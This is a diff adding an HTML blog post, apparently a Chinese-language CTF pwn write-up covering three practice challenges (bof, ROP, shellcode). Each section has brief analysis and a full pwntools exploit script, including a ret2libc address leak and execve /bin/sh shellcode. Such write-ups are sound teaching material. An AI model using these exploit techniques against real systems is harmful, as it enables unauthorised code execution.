@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <title>Day1 | RWind</title>
+<link rel="shortcut icon" href="/">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="stylesheet" href="/css/app.css">
+  <!-- <link rel='stylesheet' href='http://fonts.useso.com/css?family=Source+Code+Pro'> -->
+  
+</head>
+</html>
+<body>
+  <nav class="app-nav">
+  
+    
+      <a href="/.">home</a>
+    
+  
+    
+      <a href="/archives">archive</a>
+    
+  
+    
+      <a href="/about">about</a>
+    
+  
+</nav>
+
+  <main class="post">
+  <article>
+  <h1 class="article-title">
+    <a href="/2020/03/08/Day1/">Day1</a>
+  </h1>
+
+  <section class="article-meta">
+    <p class="article-date">March 08 2020</p>
+  </section>
+
+  <section class="article-entry">
+    <h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><p><a href="https://imgchr.com/i/3z3GZT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/08/3z3GZT.png" alt="3z3GZT.png"></a></p>
+<p>可以看见缓冲区为0x1c，read明显栈溢出,利用程序中的system和/bin/sh直接构造</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"can you pwn me?\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span>+<span class="number">4</span>) + p32(<span class="number">0x080483F0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x0804A02C</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><img src="https://s2.ax1x.com/2020/03/08/3zGgxA.png" alt="3zGgxA.png"></p>
+<p>分析函数，发现同样是栈溢出，ELF中没有system等函数，先leak一个库中的地址，然后计算system和/bin/sh的地址</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">payload1 = <span class="string">"a"</span> * (<span class="number">0x58</span>+<span class="number">4</span>) + p32(<span class="number">0x08048390</span>) + p32(<span class="number">0x080483C0</span>) + p32(<span class="number">0x0804A010</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libcbase = leak - elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"leak addr is "</span> + hex(leak))</span><br><span class="line">log.info(<span class="string">"libc base is "</span> + hex(libcbase))</span><br><span class="line"></span><br><span class="line">systemaddr = libcbase + elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh = libcbase + next(elf.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">payload2 = <span class="string">"a"</span> * (<span class="number">0x58</span>+<span class="number">4</span>) + p32(systemaddr) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p><a href="https://imgchr.com/i/3ztHRe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/08/3ztHRe.png" alt="3ztHRe.png"></a></p>
+<p>分析函数，发现是栈溢出</p>
+<p><a href="https://imgchr.com/i/3zt7GD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/08/3zt7GD.png" alt="3zt7GD.png"></a></p>
+<p>同时存在WX权限的页，可以直接用shellcode</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line">shellcode_addr = <span class="number">0x0804A100</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"input your name\n"</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">4</span>) + p32(<span class="number">0x080483A0</span>) + p32(<span class="number">0x080483F0</span>) + p32(<span class="number">0</span>) + p32(shellcode_addr) + p32(<span class="number">100</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"input your name\n"</span>)</span><br><span class="line">paylpoad2 = <span class="string">'a'</span> * (<span class="number">0x1c</span> +<span class="number">4</span>) + p32(shellcode_addr)</span><br><span class="line">p.send(paylpoad2)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+  </section>
+</article>
+
+  
+
+  
+    
+<section class="article-comment">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+<script>
+  var disqus_shortname = 'RWind';
+  
+  var disqus_url = 'http://yoursite.com/2020/03/08/Day1/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+  
+</main>
+
+</body>
+</html>
